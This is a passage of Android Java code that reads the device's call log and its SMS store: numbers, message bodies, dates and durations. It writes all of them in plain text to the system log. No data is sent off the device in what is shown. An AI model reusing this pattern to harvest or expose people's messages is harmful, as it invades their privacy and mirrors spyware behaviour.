                case CallLog.Calls.OUTGOING_TYPE:
                    dir = "OUTGOING";
                    break;

                case CallLog.Calls.INCOMING_TYPE:
                    dir = "INCOMING";
                    break;

                case CallLog.Calls.MISSED_TYPE:
                    dir = "MISSED";
                    break;
            }
            sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
        }
        managedCursor.close();
        // textView.setText(sb);
        Log.e("Agil value --- ", sb.toString());


    }


    public List<String> getSMS() {

        List<String> sms = new ArrayList<String>();
        Uri uriSMSURI = Uri.parse("content://sms");
        StringBuffer sb = new StringBuffer();
        String strOrder = android.provider.CallLog.Calls.DATE + " DESC";
        Cursor cur = getContentResolver().query(uriSMSURI, null, null, null, strOrder);

        sb.append("SMS Details :");
        while (cur != null && cur.moveToNext()) {
            String name = cur.getString(cur.getColumnIndexOrThrow("_id"));
            String address = cur.getString(cur.getColumnIndex("address"));
            String body = cur.getString(cur.getColumnIndexOrThrow("body"));
            String date = cur.getString(cur.getColumnIndexOrThrow("date"));
            Date dateFormat = new Date(Long.valueOf(date));
            String type = null;
            switch (Integer.parseInt(cur.getString(cur.getColumnIndexOrThrow(Telephony.Sms.TYPE)))) {
                case Telephony.Sms.MESSAGE_TYPE_INBOX:
                    type = "inbox";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_SENT:
                    type = "sent";
                    break;
                case Telephony.Sms.MESSAGE_TYPE_OUTBOX:
                    type = "outbox";
                    break;
                default:
                    break;
            }
            sms.add("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);

            sb.append("\nNumber: " + address + "\n Message: " + body + "\n Date:" + dateFormat + "\n Type:" + type);
            sb.append("\n-----------------");
        }
        Log.d("SMSS", sms.toString());
        //textView.setText(sb);

        if (cur != null) {
            cur.close();
        }
        return sms;
    }

}
